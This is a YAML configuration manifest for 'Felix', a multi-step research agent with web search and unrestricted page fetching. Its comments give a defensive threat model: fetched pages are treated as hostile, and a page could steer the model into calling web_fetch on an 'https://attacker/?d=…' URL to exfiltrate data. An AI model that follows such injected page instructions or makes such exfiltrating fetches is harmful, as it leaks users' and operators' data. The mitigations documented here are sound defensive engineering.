# yaml-language-server: $schema=../schemas/manifest.schema.json
apiVersion: felix/v1
kind: Agent
metadata:
  name: deep
  version: 1.0.0
  description: Felix planning agent — multi-step research and analysis.
  tags: [deep, planning, research]
  greeting:
    headline: "What should we research?"
    subtitle: "deep plans multi-step research and analysis, then works through it. Give it a question worth a few minutes."
  starters:
    - title: "Plan a rollout"
      prompt: "Plan a multi-step rollout of a public API behind a chat UI. Include risks and validation steps."
    - title: "Research a comparison"
      prompt: "Compare Docker Compose and Kubernetes for running a small self-hosted agent API. Cite sources."
    - title: "Design an eval set"
      prompt: "Propose five golden eval prompts for a general-purpose agent and how to judge each."

spec:
  pattern: deep

  model:
    temperature: 0
    cache: true

  system_prompt:
    inline: |
      You are Felix, an expert planner and researcher.
      Break complex tasks into steps and execute them methodically.
      Research before you assert, and say which page a claim came from. If a
      search returns nothing useful, say so rather than answering from memory.
      Always refer to yourself as Felix, never as Claude or any other name.

  tools:
    - calculator
    - list_skills
    - activate_skill
    - deactivate_skill

  # Guidance for the retrieval pair, appended to the prompt only while each tool is bound —
  # it used to live in `system_prompt`, where removing `web_fetch` would have left the prompt
  # recommending it.
  tool_guidance:
    search: Use `search` to find sources; a result is a title, URL and snippet, not the page.
    web_fetch: >-
      Use `web_fetch` to read a page before relying on it. Its `prompt` says what to
      pull out, and asking for exact quotes is how to cite what the page says.

  # A research agent that cannot retrieve is a contradiction; until these existed this
  # manifest declared `pattern: deep` and could only do arithmetic. `search` finds sources,
  # `web_fetch` reads them — the two halves are useless apart.
  search_tools:
    - name: search
      description: >-
        Search the web for sources. Returns ranked titles, URLs and snippets;
        follow up with `web_fetch` to read a result rather than trusting the snippet.
      max_results: 8

  http_tools:
    - name: web_fetch
      description: >-
        Read a web page found via `search`, asking `prompt` for what you need from
        it. Rely on the page rather than the search snippet.
      # Unconfined on purpose, and the one manifest here where that is the honest
      # setting: research means reading pages nobody listed in advance. This is what
      # `content_screening` below is for — every fetched page is treated as hostile.
      allow_any_host: true
      max_bytes: 80000
      timeout_ms: 20000
      # A cheap model reads the page and answers `prompt`, so an 80 KB page costs the agent a
      # paragraph of context. That saves context and cost; it is not a security boundary.
      # The route needs a working key of its own: on an install with no Anthropic key, point
      # this at a route you have, or every fetch reports `extraction failed`.
      extract_model: claude-haiku

  # Required by the two tools above, not decoration. Search snippets are written by whoever
  # ranked for the query and fetched pages are wholly attacker-controlled, so both arrive as
  # untrusted output. Marker screening only (no `model:`), so it costs nothing per call.
  #
  # Read what this does and does not cover. It screens what comes *back*; the URL the model
  # hands to `web_fetch` passes through no screener, so a page that talks the model into
  # `web_fetch("https://attacker/?d=…")` is not stopped here. That is why inbound auth is on
  # below, and why an operator wanting a stronger control sets `model:` and `on_flag: block`.
  content_screening:
    enabled: true
    on_flag: quarantine

  memory:
    checkpointer: postgres
    store: pgvector

  # A tool result over 8000 characters is stored rather than inlined; the model gets a preview
  # and pages through the rest with `read_artifact`, so one large file or page is not re-sent
  # on every later turn.
  artifacts:
    enabled: true

  # Authenticated, but `web_fetch` reaches any host and every fetch is a paid extraction call,
  # so a run's calls and time are bounded well inside the install-wide defaults.
  limits:
    max_tool_calls: 150
    max_wall_clock_seconds: 1800

  auth:
    inbound:
      # Deliberately *not* anonymous, unlike `quick` and `support`. Anonymous access to this
      # manifest used to buy a calculator; with `web_fetch` bound unconfined it buys a
      # general-purpose egress primitive, and the two are not the same offer.
      allow_anonymous: false

  observability:
    trace: true
